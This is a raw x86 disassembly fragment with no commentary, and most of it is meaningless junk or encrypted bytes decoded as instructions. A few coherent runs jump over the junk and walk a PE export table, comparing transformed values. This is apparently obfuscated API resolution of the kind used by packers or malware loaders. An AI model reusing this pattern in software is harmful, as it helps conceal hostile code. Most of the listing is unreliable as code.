  403038:	add    DWORD PTR [edi],0x5136a9cf
  40303e:	or     eax,0xd707d151
  403043:	fwait
  403044:	adc    al,0xf6
  403046:	mov    edx,0x1cc4d4c4
  40304b:	mov    edx,0xf963ecac
  403050:	repnz test al,0xc2
  403053:	addr16 retf 0xef83
  403057:	in     al,0xbe
  403059:	fwait
  40305a:	outs   dx,BYTE PTR ds:[esi]
  40305b:	ret    
  40305c:	mov    bl,0xb9
  40305e:	bnd jns 0x403013
  403061:	aas    
  403062:	mov    WORD PTR [eax],ds
  403064:	repz and BYTE PTR [edi],bh
  403067:	jbe    0x4030ac
  403069:	fmul   QWORD PTR [edi-0x39]
  40306c:	xchg   ebp,eax
  40306d:	push   edx
  40306e:	frstor [eax+0x6a869df4]
  403074:	clc    
  403075:	cld    
  403076:	push   ss
  403077:	(bad)  
  403078:	xchg   edx,eax
  403079:	mov    ah,0x9a
  40307b:	mov    cs,ecx
  40307d:	inc    eax
  40307e:	xor    ebp,edi
  403080:	mov    eax,DWORD PTR [ebp+0x8]
  403083:	mov    ecx,DWORD PTR [ebp-0x8]
  403086:	jmp    0x403325
  40308b:	ror    esp,1
  40308d:	ror    edx,1
  40308f:	ror    ecx,1
  403091:	(bad)  
  403093:	test   al,0x59
  403095:	xchg   ebx,eax
  403096:	push   edx
  403097:	(bad)  
  403099:	mov    ecx,0x7815922e
  40309e:	js     0x40309e
  4030a0:	jle    0x40311a
  4030a2:	js     0x40311d
  4030a4:	sub    al,0xdd
  4030a6:	push   es
  4030a7:	test   BYTE PTR [esi-0x44],dh
  4030aa:	popa   
  4030ab:	fwait
  4030ac:	inc    eax
  4030ad:	jns    0x40307a
  4030af:	and    bl,dh
  4030b1:	cmp    eax,0x7c9515d0
  4030b6:	mov    esp,DWORD PTR [esi+ecx*4+0x5015e666]
  4030bd:	rol    DWORD PTR [eax],cl
  4030bf:	imul   esi,DWORD PTR [ebp+eax*1+0x41],0x208578eb
  4030c7:	cld    
  4030c8:	into   
  4030c9:	xchg   BYTE PTR [edx-0x33],bh
  4030cc:	scas   al,BYTE PTR es:[edi]
  4030cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4030ce:	or     ch,cl
  4030d0:	xchg   ebp,eax
  4030d1:	fsub   DWORD PTR ss:[edx+0x6af5af50]
  4030d8:	outs   dx,DWORD PTR ds:[esi]
  4030d9:	or     edx,DWORD PTR [ebx]
  4030db:	outs   dx,DWORD PTR ds:[esi]
  4030dc:	jecxz  0x40313b
  4030de:	adc    eax,0x39d9319f
  4030e3:	or     BYTE PTR [edx],bl
  4030e5:	push   ebx
  4030e6:	in     eax,0xf2
  4030e8:	inc    ebp
  4030e9:	sbb    bl,cl
  4030eb:	hlt    
  4030ec:	mov    bl,0x90
  4030ee:	or     BYTE PTR [esi],cl
  4030f0:	jl     0x403099
  4030f2:	arpl   WORD PTR [ebx-0x35956849],di
  4030f8:	imul   BYTE PTR [ebx+0x75d87a3]
  4030fe:	mov    ds:0xee6ad0b8,al
  403103:	add    cl,BYTE PTR [eax-0x7c]
  403106:	mov    WORD PTR [ebp+0x21],es
  403109:	rcr    DWORD PTR [ebx-0x378d92e],cl
  40310f:	push   edx
  403110:	into   
  403111:	push   edi
  403112:	pushf  
  403113:	add    al,0x22
  403115:	pop    edx
  403116:	jb     0x403111
  403118:	aas    
  403119:	sar    ebp,1
  40311b:	mov    bl,0xee
  40311d:	loope  0x40318e
  40311f:	leave  
  403120:	xchg   edx,eax
  403121:	sub    eax,0xa442408b
  403126:	cmp    BYTE PTR fs:[ebx+0x64],ch
  40312a:	add    BYTE PTR [edi-0x36],cl
  40312d:	or     cl,cl
  40312f:	inc    edx
  403130:	mov    ecx,0x39171da0
  403135:	and    al,BYTE PTR [ecx+eax*2+0x56a5808d]
  40313c:	imul   eax,ebp,0xadcc7c02
  403142:	mov    BYTE PTR [ecx+0x21],dh
  403145:	xchg   edi,eax
  403146:	mov    ecx,0xb169e174
  40314b:	jb     0x4031b0
  40314d:	mov    ?,WORD PTR [eax]
  40314f:	sbb    al,0xe7
  403151:	or     eax,0xa793544c
  403156:	push   ds
  403157:	and    BYTE PTR [eax],ah
  403159:	jmp    0x403134
  40315b:	rol    DWORD PTR [ebx+0x5e],0xdc
  40315f:	gs in  al,dx
  403161:	push   0x3e
  403163:	(bad)  
  403164:	(bad)  
  403165:	sbb    ecx,DWORD PTR [ebp-0x2186e610]
  40316b:	mov    fs,WORD PTR [ebx]
  40316d:	dec    ecx
  40316e:	cwde   
  40316f:	jp     0x40318f
  403171:	cmp    BYTE PTR [ecx],ah
  403173:	out    dx,al
  403174:	jmp    DWORD PTR [edi+0x66]
  403177:	and    ch,BYTE PTR [eax-0x30ed2797]
  40317d:	fstp   QWORD PTR [eax]
  40317f:	ret    
  403180:	cld    
  403181:	ficomp WORD PTR [edx]
  403183:	mov    ds:0xc2951cd6,eax
  403188:	data16 jge 0x4031ef
  40318b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40318c:	push   edi
  40318d:	add    cl,al
  40318f:	pop    esi
  403190:	imul   esi,DWORD PTR [eax+edi*1],0xffffffa1
  403194:	shr    DWORD PTR [eax+0x39],1
  403197:	call   0x3736abea
  40319c:	rcr    DWORD PTR ds:0x8376a4e4,0x2f
  4031a3:	ss mov dh,0xc7
  4031a6:	mov    BYTE PTR [eax],0x9a
  4031a9:	pop    edi
  4031aa:	sub    dh,BYTE PTR [esi-0x56]
  4031ad:	fcomp  DWORD PTR [ebx]
  4031af:	mov    DWORD PTR [edi],ecx
  4031b1:	push   esp
  4031b2:	je     0x403146
  4031b4:	inc    ebx
  4031b5:	jae    0x4031ea
  4031b7:	push   esp
  4031b8:	adc    eax,0x30d9a545
  4031bd:	jp     0x4031c6
  4031bf:	inc    ebp
  4031c0:	pushf  
  4031c1:	test   eax,0x315122fe
  4031c6:	cwde   
  4031c7:	rcr    DWORD PTR [eax],cl
  4031c9:	push   ecx
  4031ca:	dec    esi
  4031cb:	sub    BYTE PTR [eax],ch
  4031cd:	ins    BYTE PTR es:[edi],dx
  4031ce:	pusha  
  4031cf:	mov    bh,0x41
  4031d1:	es push ecx
  4031d3:	scas   al,BYTE PTR es:[di]
  4031d5:	lock mov ebx,0x11c64541
  4031db:	push   edx
  4031dc:	cmp    DWORD PTR [esi+0xb8ebc7b],ecx
  4031e2:	xor    al,0x39
  4031e4:	cli    
  4031e5:	xor    DWORD PTR [eax+0x7e],ecx
  4031e8:	test   DWORD PTR [eax+ebx*1-0x2c10fe36],ecx
  4031ef:	sub    eax,0xb8045b7e
  4031f4:	jge    0x403260
  4031f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4031f7:	nop    DWORD PTR [ecx-0x163f1c97]
  4031fe:	fidivr WORD PTR [edx+eax*2]
  403201:	fdiv   DWORD PTR [esi-0x1e641bf1]
  403207:	mov    BYTE PTR [ecx],cl
  403209:	xchg   bl,bh
  40320b:	aaa    
  40320c:	mov    cl,0x95
  40320e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40320f:	add    edx,ecx
  403211:	jo     0x4031e9
  403213:	mov    dl,0x12
  403215:	inc    esi
  403216:	push   ebp
  403217:	fcomp  st(0)
  403219:	push   edi
  40321a:	retf   0x5aab
  40321d:	out    0x79,al
  40321f:	enter  0xaff7,0x18
  403223:	test   eax,0xc2a95af9
  403228:	xchg   ebx,eax
  403229:	(bad)  
  40322a:	(bad)  
  40322b:	dec    ebp
  40322d:	cmovg  esp,DWORD PTR [eax+0x1c]
  403231:	aaa    
  403232:	sub    BYTE PTR [eax-0x60],cl
  403235:	repnz pusha 
  403237:	cdq    
  403238:	mov    ds:0xbfe09935,al
  40323d:	cmp    cl,BYTE PTR [ecx]
  40323f:	pusha  
  403240:	adc    DWORD PTR [edx+ecx*1],ecx
  403243:	inc    edi
  403244:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403245:	in     al,dx
  403246:	hlt    
  403247:	(bad)  
  403248:	mov    esp,DWORD PTR [ebp+0x282c7e98]
  40324e:	les    esp,FWORD PTR [esi+0x6360ff18]
  403254:	lds    ecx,FWORD PTR [esi]
  403256:	sub    al,0x53
  403258:	fnstcw WORD PTR [ecx-0x34]
  40325b:	adc    BYTE PTR [ebx+0x42575c85],0x4c
  403262:	mov    ecx,0x96872d39
  403267:	mov    esp,0xde2a4187
  40326c:	fs scas eax,DWORD PTR es:[edi]
  40326e:	or     BYTE PTR [eax+ebx*4+0x54],0xf0
  403273:	out    0x8b,al
  403275:	push   0xa61dd2f5
  40327a:	gs addr16 xor al,0x90
  40327e:	sub    BYTE PTR [eax-0x18],bl
  403281:	les    esp,FWORD PTR [esi-0x32c8714d]
  403287:	lods   al,BYTE PTR ds:[esi]
  403288:	and    DWORD PTR [ebx],esp
  40328a:	or     DWORD PTR [edi-0x5d],ebx
  40328d:	pop    ds
  40328e:	(bad)  
  40328f:	cmc    
  403290:	xchg   esi,eax
  403291:	rcr    cl,1
  403293:	mov    BYTE PTR [esp+ebx*2-0x3100072b],dl
  40329a:	daa    
  40329b:	jmp    0x40322e
  40329d:	pushf  
  40329e:	out    0x40,eax
  4032a0:	add    DWORD PTR [ebx],ebp
  4032a2:	iret   
  4032a3:	adc    ch,BYTE PTR [eax-0x7d]
  4032a6:	mov    eax,ds:0xf85c575e
  4032ab:	xor    BYTE PTR [esi],cl
  4032ad:	loopne 0x40325c
  4032af:	fisubr WORD PTR [edx-0x23]
  4032b2:	and    al,0xe6
  4032b4:	fcom   DWORD PTR [esi]
  4032b6:	mov    esi,0xaaea61c9
  4032bb:	fisub  DWORD PTR [edi]
  4032bd:	and    BYTE PTR [ebx+eax*2],dh
  4032c0:	pop    ebp
  4032c1:	add    DWORD PTR [ecx+0x12c9dba5],eax
  4032c7:	shl    edx,cl
  4032c9:	jg     0x40327b
  4032cb:	(bad)  
  4032cc:	out    0xcc,eax
  4032ce:	je     0x40333b
  4032d0:	jb     0x40326e
  4032d2:	inc    eax
  4032d3:	in     eax,0xe7
  4032d5:	pop    ebp
  4032d6:	fcomi  st,st(5)
  4032d8:	(bad)  
  4032d9:	push   0x3dbf372a
  4032de:	sub    eax,0xab4d0e03
  4032e3:	popa   
  4032e4:	pop    esp
  4032e5:	pop    ebx
  4032e6:	jp     0x403339
  4032e8:	cdq    
  4032e9:	xchg   esp,edi
  4032eb:	inc    esp
  4032ec:	jl     0x40335c
  4032ee:	mov    BYTE PTR [ecx-0x6284b3e0],ah
  4032f4:	push   ebp
  4032f5:	mov    al,0xfd
  4032f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4032f8:	jg     0x403352
  4032fa:	mov    bl,0xa5
  4032fc:	inc    ebx
  4032fd:	icebp  
  4032fe:	gs xchg ebp,eax
  403300:	fisubr WORD PTR [esi+0x525267ea]
  403306:	lds    eax,FWORD PTR [ecx+0xe]
  403309:	cmp    esi,ebp
  40330b:	mov    esi,0xab78ce64
  403310:	inc    ebx
  403311:	pop    ds
  403312:	inc    esp
  403313:	or     esi,0x831556a9
  403319:	push   edx
  40331a:	fimul  DWORD PTR [ecx+0x6]
  40331d:	dec    edi
  40331e:	adc    ch,BYTE PTR [ebx+0x26]
  403321:	sub    BYTE PTR [edx],ch
  403323:	jno    0x40339a
  403325:	xor    eax,esi
  403327:	add    eax,edi
  403329:	cmp    DWORD PTR [ecx],eax
  40332b:	je     0x4040c9
  403331:	mov    ecx,DWORD PTR [ebp-0x14]
  403334:	mov    eax,DWORD PTR [ebp-0x8]
  403337:	mov    eax,DWORD PTR [eax]
  403339:	mov    eax,DWORD PTR [eax+0x3c]
  40333c:	lea    ecx,[ecx*8+0x78]
  403343:	add    eax,ecx
  403345:	mov    ecx,DWORD PTR [ebp-0x8]
  403348:	mov    ecx,DWORD PTR [ecx]
  40334a:	mov    eax,DWORD PTR [eax+ecx*1]
  40334d:	mov    DWORD PTR [ebp-0x1c],eax
  403350:	mov    eax,DWORD PTR [ebp+0x8]
  403353:	xor    eax,esi
  403355:	add    eax,edi
  403357:	mov    DWORD PTR [ebp-0x20],eax
  40335a:	mov    eax,DWORD PTR [ebp+0x8]
  40335d:	mov    ecx,DWORD PTR [ebp-0x1c]
  403360:	jmp    0x4035ff
  403365:	(bad)  
  403366:	cmp    al,0xcf
  403368:	cmp    al,0xd9
  40336a:	rcr    ecx,cl
  40336c:	fidiv  DWORD PTR [ecx-0x2d3dc34a]
  403372:	ins    DWORD PTR es:[edi],dx
  403373:	cmp    eax,0x781a105e
  403378:	js     0x403378
  40337a:	jle    0x4033f4
  40337c:	js     0x4033a0
  40337e:	adc    al,0x49
  403380:	call   0x693:0x8b4dc58
  403387:	in     eax,0x64
  403389:	repz rcr BYTE PTR ds:0x4d39d980,0x5c
  403391:	dec    ebp
  403392:	stos   DWORD PTR es:[edi],eax
  403393:	imul   edx,DWORD PTR [esi],0x2d
  403396:	cmp    dl,cl
  403398:	dec    esp
  403399:	add    DWORD PTR [ecx],edi
  40339b:	test   eax,0x68da6169
  4033a0:	xor    DWORD PTR [esi+0x35d334f6],ebp
  4033a6:	btc    esi,0x38
  4033aa:	dec    ebx
  4033ab:	pop    eax
  4033ac:	in     eax,0x1
  4033ae:	cmp    BYTE PTR [edi-0x22223f62],al
  4033b4:	jmp    0x8a553c21
  4033b9:	sub    al,0xd
  4033bb:	adc    edx,DWORD PTR [edx-0x10]
  4033be:	out    0x66,al
  4033c0:	rcr    BYTE PTR [esi],1
  4033c2:	ss xchg esi,eax
  4033c4:	(bad)  
  4033c5:	jecxz  0x4033a0
  4033c7:	dec    esi
  4033c8:	or     BYTE PTR [ecx+0x49],dh
  4033cb:	outs   dx,DWORD PTR ds:[esi]
  4033cc:	mov    ds:0x8f66afe2,eax
  4033d1:	and    eax,0x147bbc82
  4033d6:	cmp    eax,0x781ecfbe
  4033db:	mov    cl,0xc
  4033dd:	lods   eax,DWORD PTR ds:[esi]
  4033de:	pop    edx
  4033df:	jp     0x403438
  4033e1:	xchg   BYTE PTR [ebx+0x91626ee],bl
  4033e7:	outs   dx,DWORD PTR ds:[esi]
  4033e8:	mov    dl,ch
  4033ea:	add    eax,0xe9de3a18
  4033ef:	jno    0x4033da
  4033f1:	xchg   edx,eax
  4033f2:	stos   DWORD PTR es:[edi],eax
  4033f3:	mov    bh,BYTE PTR [edx+0x45db3545]
  4033f9:	inc    ebp
  4033fa:	and    al,0xff
  4033fc:	sbb    DWORD PTR [eax],esp
  4033fe:	shl    BYTE PTR ds:0xb6751202,cl
  403404:	and    DWORD PTR [edx+ebp*1],edx
  403407:	loope  0x4033bd
  403409:	xor    esp,ebp
  40340b:	iret   
  40340c:	add    BYTE PTR [eax+0x12],ah
  40340f:	or     ecx,edi
  403411:	dec    ecx
  403412:	xchg   BYTE PTR [ebx],al
  403414:	jo     0x40348b
  403416:	jl     0x40347d
  403418:	fs push ecx
  40341a:	pop    edx
  40341b:	or     al,0x7d
  40341d:	jmp    0xc1d9bcb4
  403422:	jecxz  0x403460
  403424:	clc    
  403425:	inc    esi
  403426:	ss retf 
  403428:	xchg   ebp,eax
  403429:	sbb    eax,0x4a851e82
  40342e:	mov    bl,0xb7
  403430:	cmp    ecx,DWORD PTR [ebp-0x5b5d3d45]
  403436:	fs push esi
  403438:	retf   
  403439:	jl     0x403460
  40343b:	(bad)  
  40343d:	xchg   ecx,eax
  40343e:	loope  0x403493
  403440:	popa   
  403441:	idiv   DWORD PTR [edi+0x1f9af8a6]
  403447:	and    DWORD PTR [edx],0xe0d853ed
  40344d:	pushf  
  40344e:	ds jae 0x403437
  403451:	xchg   edx,eax
  403452:	jnp    0x4033da
  403454:	xchg   edi,eax
  403455:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  403457:	call   0xed5d12c3
  40345c:	mov    al,0x70
  40345e:	sub    bl,BYTE PTR [ebx-0x7d]
  403461:	popa   
  403462:	xchg   cl,cl
  403464:	jp     0x403453
  403466:	mov    esp,0xca9cb6a1
  40346b:	lock adc BYTE PTR [edx],bh
  40346e:	mov    ds:0x612d754a,eax
  403473:	sub    al,0x1d
  403475:	push   edx
  403476:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403477:	pusha  
  403478:	into   
  403479:	xor    al,bl
  40347b:	in     eax,0x45
  40347d:	(bad)  
  40347e:	cmp    eax,0x9f20a949
  403483:	mov    ch,0x5f
  403485:	cmp    eax,0x2ff2ecbf
  40348a:	pop    ebp
  40348b:	repz fbstp TBYTE PTR [edx]
  40348e:	fidiv  DWORD PTR [eax+0x57295d4]
  403494:	adc    DWORD PTR [ebx+ebp*2+0x6599e582],ecx
  40349b:	repnz or BYTE PTR [eax-0xe9d6dc7],bh
  4034a2:	dec    esp
  4034a3:	sbb    ch,dl
  4034a5:	sbb    eax,0x6484f83
  4034aa:	(bad)  
  4034ab:	mov    DWORD PTR [ecx+0x1cb4ed05],0x335ea559
  4034b5:	xor    eax,0xfc592932
  4034ba:	ss add al,0xfd
  4034bd:	ficomp WORD PTR [edi]
  4034bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4034c0:	addr16 pop ebp
  4034c2:	fidiv  WORD PTR [ebp+eax*4+0x5f9a7191]
  4034c9:	or     eax,0xfcf000e6
  4034ce:	test   DWORD PTR [esp+ebp*2],edi
  4034d1:	jp     0x4034c9
  4034d3:	sbb    DWORD PTR [esp+edx*8-0x266d5c5a],eax
  4034da:	repnz and DWORD PTR [esi+edx*1],esp
  4034de:	shl    cl,cl
  4034e0:	shr    DWORD PTR ds:0x7bc18d8b,1
  4034e6:	les    ebx,FWORD PTR [ebp-0x61d63c59]
  4034ec:	push   ecx
  4034ed:	inc    ebx
  4034ee:	mov    bh,0xcb
  4034f0:	fxch   st(2)
  4034f2:	int    0xb6
  4034f4:	jns    0x4034fb
  4034f6:	push   cs
  4034f7:	enter  0xae96,0x19
  4034fb:	inc    esi
  4034fc:	push   esi
  4034fd:	mov    ds:0xe6c91c8c,eax
  403502:	dec    ecx
  403503:	sbb    ch,BYTE PTR [eax]
  403505:	out    dx,eax
  403506:	inc    ebp
  403507:	mov    cl,0x4c
  403509:	push   edx
  40350a:	mov    DWORD PTR [ecx-0x5d],ecx
  40350d:	in     eax,0xfb
  40350f:	shr    BYTE PTR [esi-0x67],cl
  403512:	jne    0x4034d9
  403514:	stc    
  403515:	sub    eax,0x20c5818f
  40351a:	ret    0xb09c
  40351d:	mov    bh,0x1d
  40351f:	mov    ah,0x97
  403521:	jp     0x403522
  403523:	out    0x91,al
  403525:	mov    ah,0x7e
  403527:	stos   DWORD PTR es:[edi],eax
  403528:	cmp    edx,DWORD PTR [esi]
  40352a:	popa   
  40352b:	dec    ebp
  40352c:	or     BYTE PTR [edx-0x3bcae93d],0x51
  403533:	ins    DWORD PTR es:[edi],dx
  403534:	mov    esi,0x100a81db
  403539:	mov    eax,ds:0x199edc05
  40353e:	or     BYTE PTR [ecx-0x3b4f72ef],dl
  403544:	call   0xadb83b72
  403549:	js     0x4034eb
  40354b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40354c:	scas   al,BYTE PTR es:[edi]
  40354d:	aam    0xe9
  40354f:	or     eax,DWORD PTR [esi]
  403551:	mov    bl,BYTE PTR [esi+0x4cc9f537]
  403557:	dec    ebx
  403558:	and    al,0x16
  40355a:	cmp    eax,0x2f2f172f
  40355f:	shl    BYTE PTR [eax-0x1fbc54a4],1
  403565:	xchg   ebp,eax
  403566:	loope  0x40350e
  403568:	xlat   BYTE PTR ds:[ebx]
  403569:	dec    esi
  40356a:	les    eax,FWORD PTR [ebx+0x68]
  40356d:	sub    DWORD PTR [ebx],ebp
  40356f:	lea    edi,[edx+0x2f96cdf4]
  403575:	cld    
  403576:	pop    esp
  403577:	dec    esi
  403578:	adc    DWORD PTR [ebp+edx*1+0x692b5aa4],esi
  40357f:	mov    ah,0x1d
  403581:	pop    ecx
  403582:	dec    ebx
  403583:	adc    ebp,DWORD PTR [eax-0x1e]
  403586:	adc    BYTE PTR [ebx-0x60],bh
  403589:	or     BYTE PTR [ebx+edi*8],0xf6
  40358d:	sar    BYTE PTR [edx],0x4c
  403590:	sbb    esp,DWORD PTR [edx-0x26]
  403593:	test   BYTE PTR [ebx+0x37720890],bh
  403599:	push   eax
  40359a:	lea    ecx,[eax-0x49]
  40359d:	cmp    al,0xfe
  40359f:	xor    DWORD PTR [ecx+0x62f77e3d],edi
  4035a5:	mov    edx,esi
  4035a7:	add    DWORD PTR [edi+0x4b],esi
  4035aa:	xchg   edi,eax
  4035ab:	inc    edi
  4035ac:	(bad)  
  4035ad:	leave  
  4035ae:	mov    esi,0x77fb5b67
  4035b3:	adc    esp,edi
  4035b5:	and    DWORD PTR [edx+0x395dadbb],esi
  4035bb:	iret   
  4035bc:	xor    eax,0xae20b066
  4035c1:	repnz test BYTE PTR [eax+0x5da8ec92],bh
  4035c8:	repnz add BYTE PTR [edi],0x37
  4035cc:	ins    BYTE PTR es:[edi],dx
  4035cd:	enter  0xdf4,0xb9
  4035d1:	jne    0x40359c
  4035d3:	and    DWORD PTR [esi-0x11ef2229],esi
  4035d9:	sub    DWORD PTR [edi],esi
  4035db:	ins    DWORD PTR es:[edi],dx
  4035dc:	(bad)  
  4035dd:	pop    ds
  4035de:	ins    BYTE PTR es:[edi],dx
  4035df:	jp     0x4035d6
  4035e1:	add    DWORD PTR [edi+edi*4],ecx
  4035e4:	jb     0x40364e
  4035e6:	test   bl,0x99
  4035e9:	or     al,0x67
  4035eb:	call   0x3f4c:0x85f58935
  4035f2:	cld    
  4035f3:	push   edi
  4035f4:	cmp    edx,ecx
  4035f6:	out    0xd0,eax
  4035f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4035f9:	sbb    DWORD PTR [edi],0x2c
  4035fc:	jge    0x4035c4
  4035fe:	inc    ecx
  4035ff:	xor    eax,esi
  403601:	add    eax,edi
  403603:	cmp    ecx,eax
  403605:	je     0x404380
  40360b:	mov    eax,DWORD PTR [ebp-0x8]
  40360e:	mov    ecx,DWORD PTR [ebp-0x1c]
  403611:	add    ecx,DWORD PTR [eax]
  403613:	mov    DWORD PTR [ebp-0x20],ecx
  403616:	mov    eax,DWORD PTR [ebp-0x20]
  403619:	mov    ecx,DWORD PTR [ebp-0x8]
  40361c:	mov    eax,DWORD PTR [eax+0xc]
  40361f:	mov    ecx,DWORD PTR [ecx]
  403621:	jmp    0x4038c0
  403626:	xlat   BYTE PTR ds:[ebx]
  403627:	aas    
  403628:	mov    al,0xd6
  40362b:	(bad)
  40362e:	fwait
  40362f:	clc    
  403630:	mov    BYTE PTR ds:0x7f12295e,0x96
  403637:	sbb    BYTE PTR [eax+0x78],bh
  40363a:	(bad)  
  40363b:	jle    0x4036b5
  40363d:	js     0x403677
  40363f:	pop    edx
  403640:	inc    edi
  403641:	pushf  
  403642:	call   0xf559:0x7ce3084b
  403649:	xchg   ecx,eax
  40364a:	mov    dh,0x6a
  40364c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40364d:	sbb    BYTE PTR [ebp-0x66],0xe8
  403651:	xor    al,0x8c
  403653:	mov    edx,DWORD PTR [ebp+eax*2+0x5e]
  403657:	ins    BYTE PTR es:[edi],dx
  403658:	outs   dx,DWORD PTR ds:[esi]
  403659:	std    
  40365a:	lock in al,dx
  40365c:	pop    edi
  40365d:	inc    ebx
  40365e:	add    al,0x36
  403660:	lods   al,BYTE PTR ds:[esi]
  403661:	loope  0x403631
  403663:	loop   0x4035fa
  403665:	dec    esi
  403666:	fld    DWORD PTR [edi]
  403668:	add    esi,ebx
  40366a:	pusha  
  40366b:	push   ecx
  40366c:	mov    DWORD PTR [esp+edi*8+0x2f0660a6],ecx
  403673:	les    ebx,FWORD PTR [ecx-0x22]
  403676:	retf   
  403677:	xor    ebp,ebx
  403679:	and    al,0x43
  40367b:	jb     0x4036ee
  40367d:	leave  
  40367e:	cdq    
  40367f:	cli    
  403680:	in     eax,dx
  403681:	test   DWORD PTR [ecx],ecx
  403683:	retf   0xf0d8
  403686:	mov    bh,0xd9
  403688:	jb     0x4036ff
  40368a:	test   eax,0x86cb36fe
  40368f:	in     eax,dx
  403690:	cli    
  403691:	out    dx,al
  403692:	aam    0x6c
  403694:	arpl   ax,di
  403696:	adc    BYTE PTR [ebx],cl
  403698:	sbb    dl,BYTE PTR [edx-0x49a9aa10]
  40369e:	or     eax,0x3fa33cc2
  4036a3:	and    cl,bl
  4036a5:	xchg   BYTE PTR [edi+edx*2+0xe],dl
  4036a9:	ja     0x40362e
  4036ab:	les    esi,FWORD PTR [ebp+0x1fd3c7a8]
  4036b1:	jno    0x4036f7
  4036b3:	leave  
  4036b4:	mov    eax,ds:0x551aef2d
  4036b9:	int3   
  4036ba:	sub    DWORD PTR [ecx-0x2c6cceb9],0x75da6a7b
  4036c4:	mov    dh,0x9e
  4036c6:	test   BYTE PTR [esi+0x5b6a9cb3],al
  4036cc:	add    BYTE PTR [ebx],dh
  4036ce:	add    BYTE PTR [ebp+eiz*4-0x57],ah
  4036d2:	add    edx,DWORD PTR [edx+0x633afb92]
  4036d8:	out    dx,al
  4036d9:	push   ebp
  4036da:	xchg   edi,eax
  4036db:	rcr    DWORD PTR [edi+0x6200f4d9],1
  4036e1:	pop    edi
  4036e2:	dec    ecx
  4036e3:	pop    esi
  4036e4:	pop    edi
  4036e5:	xor    eax,0x294fb67a
  4036ea:	lahf   
  4036eb:	mov    ecx,0x2f871e7b
  4036f0:	ret    
  4036f1:	and    al,0x79
  4036f3:	je     0x4036aa
  4036f5:	repz xlat BYTE PTR ds:[ebx]
  4036f7:	pushf  
  4036f8:	jecxz  0x4036c6
  4036fa:	cmp    DWORD PTR [ecx],eax
  4036fc:	or     bl,BYTE PTR [edx]
  4036fe:	dec    esi
  4036ff:	iret   
  403700:	mov    BYTE PTR [ebx+0x9],0xfe
  403704:	mov    al,0x2
  403706:	imul   BYTE PTR [ebx+0x4e]
  403709:	pop    es
  40370a:	and    bl,BYTE PTR [esi]
  40370c:	mov    ebp,0x7cc3e6ee
  403711:	add    al,0x51
  403713:	das    
  403714:	pop    es
  403715:	mov    dh,0xed
  403717:	adc    DWORD PTR [edi+0x75304c0f],edx
  40371d:	in     eax,dx
  40371e:	xchg   edi,eax
  40371f:	sub    DWORD PTR cs:[esi+0x4ca9f689],0x6b84d0dd
  40372a:	push   eax
  40372b:	lods   eax,DWORD PTR ds:[esi]
  40372c:	sahf   
  40372d:	fxch   st(3)
  40372f:	out    0x7c,eax
  403731:	or     DWORD PTR ds:0x91b5539f,ecx
  403737:	mov    ecx,0x40ab04f2
  40373c:	retf   
  40373d:	jle    0xffacf4da
  403743:	in     al,dx
  403744:	sahf   
  403745:	mov    esp,0x19dc400b
  40374a:	jl     0x403755
  40374c:	cli    
  40374d:	mov    al,ds:0xd11b68bc
  403752:	je     0x4036e1
  403754:	clc    
  403755:	addr16 test eax,0x5b3e58af
  40375b:	cwde   
  40375c:	dec    ebp
  40375d:	push   ebx
  40375e:	lock mov cl,0xdc
  403761:	mov    edi,0x181eaa4b
  403766:	dec    ebp
  403767:	(bad)  
  403768:	lds    esp,FWORD PTR [ebp-0x212dd016]
  40376e:	jp     0x403766
  403770:	pop    ebx
  403771:	dec    esi
  403772:	fisttp WORD PTR [ecx-0x30]
  403775:	xchg   BYTE PTR [eax+0xa04a2d0],bh
  40377b:	arpl   WORD PTR [edi+0x43],sp
  40377e:	or     bl,BYTE PTR [edi]
  403780:	cmp    ch,BYTE PTR [edi+0x4def03c]
  403786:	sbb    eax,0x9bafccce
  40378b:	jns    0x403737
  40378d:	push   ss
  40378e:	pusha  
  40378f:	mul    BYTE PTR [esi+0x4107e1d5]
  403795:	xor    al,0xfd
  403797:	jle    0x403758
  403799:	call   0xc89c90f1
  40379e:	mov    ebp,0xd951790
  4037a3:	inc    cl
  4037a5:	push   esi
  4037a6:	or     al,0x24
  4037a8:	pop    ss
  4037a9:	xchg   ebp,eax
  4037aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4037ab:	jl     0x4037b1
  4037ad:	add    BYTE PTR [ebx+0x7851af3c],dl
  4037b3:	mov    WORD PTR [ebx+ebx*8],fs
  4037b6:	or     eax,0x3bb8db17
  4037bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4037bc:	push   edi
  4037bd:	dec    edx
  4037be:	mov    eax,0xea1e6892
  4037c3:	div    BYTE PTR ds:0x11da27d6
  4037c9:	dec    ecx
  4037ca:	std    
  4037cb:	adc    eax,0x87995c18
  4037d0:	in     al,0xc9
  4037d2:	xchg   ebp,eax
  4037d3:	jno    0x403809
  4037d5:	or     cl,BYTE PTR ds:[ebp+0x12bc339d]
  4037dc:	leave  
  4037dd:	sti    
  4037de:	jbe    0x403789
  4037e0:	pop    es
  4037e1:	add    edx,DWORD PTR [esi]
  4037e3:	ret    
  4037e4:	or     al,0x57
  4037e6:	xchg   ebp,eax
  4037e7:	mov    edx,DWORD PTR [ebx+0x43]
  4037ea:	xlat   BYTE PTR ds:[ebx]
  4037eb:	xor    al,0x92
  4037ed:	(bad)  
  4037ee:	push   edi
  4037ef:	sbb    ah,ah
  4037f1:	repnz or esi,eax
  4037f4:	cmp    DWORD PTR [ecx+0x3f1cd357],edx
  4037fa:	popa   
  4037fb:	lds    esi,FWORD PTR [ebp-0x5]
  4037fe:	hlt    
  4037ff:	neg    DWORD PTR [eax+0x780c3467]
  403805:	jp     0x403813
  403807:	loop   0x40380b
  403809:	loopne 0x4037dc
  40380b:	jne    0x4037a8
  40380d:	lahf   
  40380e:	les    edx,FWORD PTR [esi]
  403810:	mov    esi,0xdf4dc0a3
